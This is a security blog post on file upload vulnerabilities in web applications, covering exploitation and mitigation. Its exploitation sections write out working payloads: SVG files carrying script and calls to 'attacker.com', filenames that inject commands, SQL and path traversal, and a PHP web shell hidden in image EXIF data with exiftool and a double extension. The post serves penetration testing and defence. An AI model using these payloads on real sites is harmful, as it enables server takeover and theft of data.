<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>File Upload Bypass: Understanding and Mitigating Risks in Web Applications - Offens!ve Blogs - Sakibul Ali Khan</title><meta name="description" content="Learn about file upload vulnerabilities, exploitation techniques, and best practices to secure web applications against attacks. Enhance your cybersecurity knowledge!"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="File Upload Bypass: Understanding and Mitigating Risks in Web Applications"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3.png"><meta property="og:image:width" content="781"><meta property="og:image:height" content="384"><meta property="og:site_name" content="Offens!ve Blogs - Sakibul Ali Khan"><meta property="og:description" content="Learn about file upload vulnerabilities, exploitation techniques, and best practices to secure web applications against attacks. Enhance your cybersecurity knowledge!"><meta property="og:url" content="https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="File Upload Bypass: Understanding and Mitigating Risks in Web Applications"><meta name="twitter:description" content="Learn about file upload vulnerabilities, exploitation techniques, and best practices to secure web applications against attacks. Enhance your cybersecurity knowledge!"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3.png"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/montserrat/montserrat.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=0b0d9171b2867c62a838a06b77b14305"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html"},"headline":"File Upload Bypass: Understanding and Mitigating Risks in Web Applications","datePublished":"2024-08-10T05:14","dateModified":"2024-08-10T14:46","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3.png","height":384,"width":781},"description":"Learn about file upload vulnerabilities, exploitation techniques, and best practices to secure web applications against attacks. Enhance your cybersecurity knowledge!","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script type="text/javascript">(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "kza4v42pst");</script><style>.extlink::after {
				background-color: currentColor;
				content: "";
				display: inline-block;
				height: 16px; 
				margin-left: 5px;
				position: relative;
				top: 0px;
				width: 16px; 
			}
		.extlink.extlink-icon-5::after { mask-image: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' fill='none' stroke='%23000000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'><path d='M22 12A10 10 0 1 1 12 2'/><path d='M22 2 12 12'/><path d='M16 2h6v6'/></svg>"); }</style></head><body><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><script src="https://mpeztrack.com/v1.0.0/eztrack.min.js" type="text/javascript"></script><script>mpEZTrack.init("3799246d338f6a319e081a697ab7eca4");</script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="Offens!ve Blogs - Sakibul Ali Khan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li class="has-submenu"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self" aria-haspopup="true">CTF Writeups</a><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://sakibulalikhan.pages.dev/tags/hackthebox/" title="HackTheBox" target="_self">HackTheBox</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" title="TryHackMe" target="_self">TryHackMe</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/hackviser/" title="Hackviser" target="_self">Hackviser</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctftime/" title="CTFtime" target="_self">CTFtime</a></li></ul></li><li><a href="https://sakibulalikhan.pages.dev/about.html" target="_self">About</a></li><li><a href="https://docs.google.com/document/d/10NGJ-Hn7zm6TEEfJIg3K3gqg3wLZ-6BLT77npYOHm4k/edit" title="Sakibul Ali Khan - Resume" target="_blank" rel="Sakibul Ali Khan">Resume</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">File Upload Bypass: Understanding and Mitigating Risks in Web Applications</h1><div class="post__meta"><time datetime="2024-08-10T05:14" class="post__date">Aug 10, 2024 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/owasp-10/" class="invert">OWASP 10</a> <a href="https://sakibulalikhan.pages.dev/tags/pentesting/" class="invert">Pentesting</a> <a href="https://sakibulalikhan.pages.dev/tags/web-security/" class="invert">Web Security</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3.png" srcset="https://sakibulalikhan.pages.dev/media/posts/31/responsive/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-xs.png 300w, https://sakibulalikhan.pages.dev/media/posts/31/responsive/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-sm.png 480w, https://sakibulalikhan.pages.dev/media/posts/31/responsive/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-md.png 768w, https://sakibulalikhan.pages.dev/media/posts/31/responsive/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-lg.png 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="384" width="781" alt="File Upload Bypass: Understanding and Mitigating Risks in Web Applications"></figure><div class="post__entry"><h2 class="code-line" data-line-start="2" data-line-end="3">Introduction</h2><p class="has-line-data" data-line-start="4" data-line-end="5">File upload vulnerabilities are a significant concern in the realm of web application security. When a web application allows users to upload files without proper validation and security measures, it opens the door for attackers to upload malicious files that can be executed on the server. This can lead to various attacks, including the deployment of phishing pages, data exfiltration, and server compromise.</p><p class="has-line-data" data-line-start="6" data-line-end="7">Despite the inherent risks, file uploads are a common requirement in modern web applications. However, many developers and security professionals underestimate the potential dangers associated with insecure file upload mechanisms. This blog post aims to shed light on the various risks associated with file uploads, the types of attacks that can be executed, and the best practices for securing file upload functionalities.</p><h2 class="code-line" data-line-start="8" data-line-end="9"><a id="Risks_of_Exploiting_File_Upload_Vulnerabilities_8"></a>Risks of Exploiting File Upload Vulnerabilities</h2><p class="has-line-data" data-line-start="10" data-line-end="11">Exploiting file upload vulnerabilities can lead to a variety of malicious outcomes, including but not limited to:</p><ul><li class="has-line-data" data-line-start="12" data-line-end="13"><strong>Remote Code Execution (RCE)</strong></li><li class="has-line-data" data-line-start="13" data-line-end="14"><strong>Server-Side Request Forgery (SSRF)</strong></li><li class="has-line-data" data-line-start="14" data-line-end="15"><strong>Cross-Site Scripting (XSS)</strong></li><li class="has-line-data" data-line-start="15" data-line-end="16"><strong>Local File Inclusion (LFI)</strong></li><li class="has-line-data" data-line-start="16" data-line-end="17"><strong>XML External Entity (XXE) attacks</strong></li><li class="has-line-data" data-line-start="17" data-line-end="18"><strong>Phishing attacks</strong></li><li class="has-line-data" data-line-start="18" data-line-end="19"><strong>Parameter pollution</strong></li><li class="has-line-data" data-line-start="19" data-line-end="20"><strong>SQL Injection</strong></li><li class="has-line-data" data-line-start="20" data-line-end="21"><strong>Denial of Service (DoS) attacks</strong></li><li class="has-line-data" data-line-start="21" data-line-end="23"><strong>And many more…</strong></li></ul><h2 class="code-line" data-line-start="23" data-line-end="24"><a id="File_Extensions_and_Their_Impacts_23"></a>File Extensions and Their Impacts</h2><p class="has-line-data" data-line-start="25" data-line-end="26">Certain file extensions can lead to specific vulnerabilities if uploaded successfully. Here’s a breakdown of some common extensions and their potential impacts:</p><table class="table table-striped table-bordered"><thead><tr><th><strong>Extension</strong></th><th><strong>Impact</strong></th></tr></thead><tbody><tr><td>ASP, ASPX, PHP5, PHP, PHP3</td><td>Webshell, RCE</td></tr><tr><td>SVG</td><td>Stored XSS, SSRF, XXE</td></tr><tr><td>GIF</td><td>Stored XSS, SSRF</td></tr><tr><td>CSV</td><td>CSV Injection</td></tr><tr><td>XML</td><td>XXE</td></tr><tr><td>AVI</td><td>LFI, SSRF</td></tr><tr><td>HTML, JS</td><td>HTML Injection, XSS, Open Redirect</td></tr><tr><td>PNG, JPEG</td><td>Pixel Flood Attack (DoS)</td></tr><tr><td>ZIP</td><td>RCE via LFI, DoS</td></tr><tr><td>PDF, PPTX</td><td>SSRF, Blind XXE</td></tr><tr><td>SCF</td><td>RCE</td></tr></tbody></table><h2 class="code-line" data-line-start="41" data-line-end="42"><a id="Exploitation_Techniques_41"></a>Exploitation Techniques</h2><h3 class="code-line" data-line-start="43" data-line-end="44"><a id="CrossSite_Scripting_XSS_43"></a>Cross-Site Scripting (XSS)</h3><p class="has-line-data" data-line-start="45" data-line-end="46">XSS can be achieved through various methods when file uploads are not properly validated. Here are some examples:</p><ol><li class="has-line-data" data-line-start="47" data-line-end="50"><p class="has-line-data" data-line-start="47" data-line-end="48"><strong>Manipulating File Names</strong>:</p><ul><li class="has-line-data" data-line-start="48" data-line-end="50">Set the filename to <code>filename="svg onload=alert(document.domain)&gt;"</code> or <code>filename="58832_300x300.jpg&lt;svg onload=confirm()"&gt;</code>.</li></ul></li><li class="has-line-data" data-line-start="50" data-line-end="53"><p class="has-line-data" data-line-start="50" data-line-end="51"><strong>Using GIF Files</strong>:</p><ul><li class="has-line-data" data-line-start="51" data-line-end="53">Upload a GIF file with the content: <code>GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;</code>.</li></ul></li><li class="has-line-data" data-line-start="53" data-line-end="65"><p data-line-start="53" data-line-end="54"><strong>Using SVG Files</strong>:</p><pre class="language-html line-numbers"><code>&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
   &lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
   &lt;script type="text/javascript"&gt;
      alert("HolyBugx XSS");
   &lt;/script&gt;
&lt;/svg&gt;</code></pre></li></ol><h3 class="code-line" data-line-start="65" data-line-end="66"><a id="Open_Redirection_65"></a>Open Redirection</h3><p class="has-line-data" data-line-start="67" data-line-end="68">Open redirection can also be exploited through SVG files:</p><pre class="language-html line-numbers"><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="window.location='https://attacker.com'"&gt;
   &lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
&lt;/svg&gt;</code></pre><h3 class="code-line" data-line-start="74" data-line-end="75"><a id="XML_External_Entity_XXE_74"></a>XML External Entity (XXE)</h3><p class="has-line-data" data-line-start="76" data-line-end="77">XXE attacks can be executed by uploading specially crafted SVG files:</p><pre class="language-html line-numbers"><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
    &lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;</code></pre><h3 class="code-line" data-line-start="83" data-line-end="84"><a id="ServerSide_Request_Forgery_SSRF_83"></a>Server-Side Request Forgery (SSRF)</h3><ol><li class="has-line-data" data-line-start="85" data-line-end="87"><p class="has-line-data" data-line-start="85" data-line-end="86"><strong>Abusing “Upload from URL”</strong>: If the application allows uploading from a URL, an attacker could specify a URL from a service like <a href="https://iplogger.org/invisible/" class="extlink extlink-icon-5" title="sakibulalikhan">IPlogger</a> to steal information from visitors.</p></li><li class="has-line-data" data-line-start="87" data-line-end="95"><p class="has-line-data" data-line-start="87" data-line-end="88"><strong>Using SVG Files</strong>:</p><pre class="language-html line-numbers"><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
   &lt;image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /&gt;
&lt;/svg&gt;</code></pre></li></ol><h3 class="code-line" data-line-start="95" data-line-end="96"><a id="Command_Injection_95"></a>Command Injection</h3><p data-line-start="97" data-line-end="98">Command injection can be attempted by setting the filename:</p><pre class="language-bash line-numbers"><code>filename ; sleep 10;</code></pre><h3 class="code-line" data-line-start="102" data-line-end="103"><a id="Local_File_Inclusion_LFI_102"></a>Local File Inclusion (LFI)</h3><p data-line-start="104" data-line-end="105">LFI can be exploited by manipulating the filename:</p><pre class="language-bash line-numbers"><code>filename ../../etc/passwd/logo.png
filename ../../../logo.png</code></pre><h3 class="code-line" data-line-start="110" data-line-end="111"><a id="SQL_Injection_110"></a>SQL Injection</h3><p data-line-start="112" data-line-end="113">SQL injection can be attempted by setting the filename:</p><pre class="language-sql line-numbers"><code>filename 'sleep(10).jpg
filename sleep(10)-- -.jpg</code></pre><h3 class="code-line" data-line-start="118" data-line-end="119"><a id="Denial_of_Service_DoS_118"></a>Denial of Service (DoS)</h3><ol><li class="has-line-data" data-line-start="120" data-line-end="122"><p class="has-line-data" data-line-start="120" data-line-end="121"><strong>Pixel Flood Attack</strong>: Upload a malicious image that causes a DoS, such as the one found <a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg" class="extlink extlink-icon-5" title="sakibulalikhan">here</a>.</p></li><li class="has-line-data" data-line-start="122" data-line-end="124"><p class="has-line-data" data-line-start="122" data-line-end="123"><strong>Large Filename Values</strong>: Use a filename with excessive characters, e.g., <code>name: 1234...99.png</code>.</p></li></ol><h3 class="code-line" data-line-start="124" data-line-end="125"><a id="ServerSide_Template_Injection_SSTI_124"></a>Server-Side Template Injection (SSTI)</h3><p class="has-line-data" data-line-start="126" data-line-end="127">SSTI can also be a risk if the application processes uploaded files in a way that allows template injection.</p><h2 class="code-line" data-line-start="128" data-line-end="129"><a id="Tools_and_Payloads_128"></a>Tools and Payloads</h2><p class="has-line-data" data-line-start="130" data-line-end="131">To assist in testing and exploiting file upload vulnerabilities, several tools and payloads are available:</p><ul><li class="has-line-data" data-line-start="132" data-line-end="133"><strong><a href="https://github.com/barrracud4/image-upload-exploits" class="extlink extlink-icon-5" title="sakibulalikhan">barrracud4/image-upload-exploits</a></strong></li><li class="has-line-data" data-line-start="133" data-line-end="134"><strong><a href="https://github.com/almandin/fuxploider" class="extlink extlink-icon-5" title="sakibulalikhan">almandin/fuxploider</a></strong></li><li class="has-line-data" data-line-start="134" data-line-end="136"><strong><a href="https://github.com/PortSwigger/upload-scanner" class="extlink extlink-icon-5" title="sakibulalikhan">PortSwigger/upload-scanner</a></strong></li></ul><h2 class="code-line" data-line-start="171" data-line-end="172"><a id="WAF_Bypass_Tips_by_0xInfection_173"></a>WAF Bypass Tips</h2><ul><li class="has-line-data" data-line-start="174" data-line-end="179"><strong>Case: File Upload (.php blocked)</strong><ul><li class="has-line-data" data-line-start="175" data-line-end="176"><code>/file=xx.php</code> &lt;- Blocked</li><li class="has-line-data" data-line-start="176" data-line-end="177"><code>/file===xx.php</code> &lt;- Bypassed</li><li class="has-line-data" data-line-start="177" data-line-end="179">The file got uploaded successfully.</li></ul></li></ul><h3 class="code-line" data-line-start="179" data-line-end="180"><a id="Bypass_File_Upload_Filtering_179"></a>Bypass File Upload Filtering</h3><h5><strong><span style="color: #e67e23;">-</span> File Renaming Technique:</strong></h5><p class="has-line-data" data-line-start="6" data-line-end="7">To bypass file upload restrictions, we can rename our shell script and upload it as <code>shell.php.jpg</code>. This method allows the file to pass through filters and be executed as PHP.</p><h5><strong><span style="color: #e67e23;">-</span> File Extensions to Consider:</strong></h5><ul style="list-style-type: circle;"><li class="has-line-data" data-line-start="10" data-line-end="11"><strong>PHP</strong>: .php, .phtml, .php3, .php4, .php5, .inc</li><li class="has-line-data" data-line-start="11" data-line-end="12"><strong>ASP</strong>: .asp, .aspx</li><li class="has-line-data" data-line-start="12" data-line-end="13"><strong>Perl</strong>: .pl, .pm, .cgi, .lib</li><li class="has-line-data" data-line-start="13" data-line-end="14"><strong>JSP</strong>: .jsp, .jspx, .jsw, .jsv, .jspf</li><li class="has-line-data" data-line-start="14" data-line-end="16"><strong>ColdFusion</strong>: .cfm, .cfml, .cfc, .dbm</li></ul><h5><strong><span style="color: #e67e23;">-</span> Content Manipulation:</strong></h5><p class="has-line-data" data-line-start="18" data-line-end="19">If the upload process checks the file content, you can prepend the text <code>GIF89a;</code> to your shell code. The modified code would look like this:</p><pre class="language-bash line-numbers"><code>GIF89a;
&lt;?
system($_GET['cmd']); // Alternatively, you can insert your complete shell code here
?&gt;</code></pre><h5><strong><span style="color: #e67e23;">-</span> Embedding in an Image:</strong></h5><p class="has-line-data" data-line-start="29" data-line-end="30">You can use ExifTool to manipulate the EXIF data of an image. For example, you can add a comment with your PHP code like this:</p><pre class="language-bash line-numbers"><code>exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' lo.jpg</code></pre><p class="has-line-data" data-line-start="35" data-line-end="36">ExifTool is a powerful utility for viewing and editing EXIF data. After modifying the image, remember to rename the file:</p><pre class="language-bash line-numbers"><code>mv lo.jpg lo.php.jpg</code></pre><h5><strong><span style="color: #e67e23;">-</span> Using exiftool</strong>:</h5><pre class="language-bash line-numbers"><code>exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' shell.jpg 
mv shell.jpg shell.php.jpg</code></pre><h3 style="margin-top: 2.28571rem; font-family: var(--font-base); font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing); font-size: 1.42383em;" data-line-start="179" data-line-end="180"><img decoding="async" loading="lazy" style="outline: 3px solid rgba(var(--color-primary-rgb), 0.55) !important;" src="https://kathan19.gitbook.io/~gitbook/image?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F33719912%2F193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=48bec4ba&amp;sv=1" data-is-external-image="true"></h3><h2 class="code-line" data-line-start="136" data-line-end="137"><a id="Mitigation_Strategies_136"></a>Mitigation Strategies</h2><p class="has-line-data" data-line-start="138" data-line-end="139">Implementing secure file upload functionality is not straightforward, but several best practices can help mitigate risks:</p><ol><li class="has-line-data" data-line-start="140" data-line-end="142"><p class="has-line-data" data-line-start="140" data-line-end="141"><strong>Use Server-Generated Filenames</strong>: When storing uploaded files on disk, generate filenames on the server to avoid predictable paths.</p></li><li class="has-line-data" data-line-start="142" data-line-end="144"><p class="has-line-data" data-line-start="142" data-line-end="143"><strong>Content Inspection</strong>: Inspect the content of uploaded files and enforce a whitelist of accepted, non-executable content types. Additionally, maintain a blacklist of common executable formats to hinder hybrid file attacks.</p></li><li class="has-line-data" data-line-start="144" data-line-end="146"><p class="has-line-data" data-line-start="144" data-line-end="145"><strong>File Extension Whitelisting</strong>: Enforce a whitelist of accepted, non-executable file extensions.</p></li><li class="has-line-data" data-line-start="146" data-line-end="148"><p class="has-line-data" data-line-start="146" data-line-end="147"><strong>Accurate Content-Type Headers</strong>: If uploaded files are downloadable, supply accurate non-generic Content-Type headers, the <code>X-Content-Type-Options: nosniff</code> header, and a <code>Content-Disposition</code> header that specifies that browsers should handle the file as an attachment.</p></li><li class="has-line-data" data-line-start="148" data-line-end="150"><p class="has-line-data" data-line-start="148" data-line-end="149"><strong>File Size Limits</strong>: Enforce a size limit on uploaded files. This can be implemented both within application code and in the web server’s configuration for defense-in-depth.</p></li><li class="has-line-data" data-line-start="150" data-line-end="152"><p class="has-line-data" data-line-start="150" data-line-end="151"><strong>Reject Archive Formats</strong>: Disallow uploads of archive formats such as ZIP, which can be used to bypass file type restrictions.</p></li></ol><h2 class="code-line" data-line-start="152" data-line-end="153"><a id="References_152"></a>References</h2><p class="has-line-data" data-line-start="154" data-line-end="155">For further reading and resources, check out the following references:</p><ul><li class="has-line-data" data-line-start="156" data-line-end="157"><a href="https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149" class="extlink extlink-icon-5" title="sakibulalikhan">Interesting Test Cases of File Uploading Vulnerabilities</a></li><li class="has-line-data" data-line-start="157" data-line-end="158"><a href="https://www.onsecurity.io/blog/file-upload-checklist" class="extlink extlink-icon-5" title="sakibulalikhan">File Upload Tricks and Checklist</a></li><li class="has-line-data" data-line-start="158" data-line-end="159"><a href="https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/" class="extlink extlink-icon-5" title="sakibulalikhan">File Upload Attacks (Part 1) - Global Bug Bounty Platform</a></li><li class="has-line-data" data-line-start="159" data-line-end="160"><a href="https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698" class="extlink extlink-icon-5" title="sakibulalikhan">Unrestricted File Upload in PHP</a></li><li class="has-line-data" data-line-start="160" data-line-end="161"><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" class="extlink extlink-icon-5" title="sakibulalikhan">File Upload - OWASP Cheat Sheet Series</a></li><li class="has-line-data" data-line-start="161" data-line-end="162"><a href="https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/" class="extlink extlink-icon-5" title="sakibulalikhan">Comprehensive Guide on Unrestricted File Upload</a></li><li class="has-line-data" data-line-start="162" data-line-end="163"><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md" class="extlink extlink-icon-5" title="sakibulalikhan">HolyBugx/HolyTips</a></li><li class="has-line-data" data-line-start="163" data-line-end="164"><a href="https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e" class="extlink extlink-icon-5" title="sakibulalikhan">Exploiting File Upload Vulnerabilities in Web Applications</a></li><li class="has-line-data" data-line-start="164" data-line-end="165"><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" class="extlink extlink-icon-5" title="sakibulalikhan">Unrestricted File Upload</a></li><li class="has-line-data" data-line-start="165" data-line-end="166"><a href="https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0" class="extlink extlink-icon-5" title="sakibulalikhan">Art of Unrestricted File Upload Exploitation</a></li><li class="has-line-data" data-line-start="166" data-line-end="167"><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" class="extlink extlink-icon-5" title="sakibulalikhan">File Upload</a></li><li class="has-line-data" data-line-start="167" data-line-end="168"><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" class="extlink extlink-icon-5" title="sakibulalikhan">Encoding Web Shells in PNG IDAT Chunks</a></li><li class="has-line-data" data-line-start="168" data-line-end="169"><a href="https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125" class="extlink extlink-icon-5" title="sakibulalikhan">Uploading Backdoor For Fun And Profit. (RCE + DB-cred = P1)</a></li><li class="has-line-data" data-line-start="169" data-line-end="171"><a href="https://secnhack.in/unrestricted-file-uploading-vulnerability/" class="extlink extlink-icon-5" title="sakibulalikhan">Unrestricted File Uploading Vulnerability - Secnhack</a></li></ul><h2 class="code-line" data-line-start="187" data-line-end="188"><a id="Conclusion_187"></a>Conclusion</h2><p class="has-line-data" data-line-start="189" data-line-end="190">File upload vulnerabilities pose a significant risk to web applications, and understanding how to exploit and mitigate these vulnerabilities is crucial for developers and security professionals alike. By implementing robust validation techniques and conducting thorough testing, organizations can significantly reduce the risk of file upload-related attacks.</p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Aug 10, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html&amp;via=sakibulalikhan&amp;text=File%20Upload%20Bypass%3A%20Understanding%20and%20Mitigating%20Risks%20in%20Web%20Applications" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F31%2FFile-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3.png&amp;description=File%20Upload%20Bypass%3A%20Understanding%20and%20Mitigating%20Risks%20in%20Web%20Applications" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=File%20Upload%20Bypass%3A%20Understanding%20and%20Mitigating%20Risks%20in%20Web%20Applications&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=File%20Upload%20Bypass%3A%20Understanding%20and%20Mitigating%20Risks%20in%20Web%20Applications https%3A%2F%2Fsakibulalikhan.pages.dev%2Ffile-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/optimize-battery-health-how-to-set-charge-thresholds-for-asus-laptops-on-linux-made-easy.html" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy "><span class="btn__icon">←</span> <span 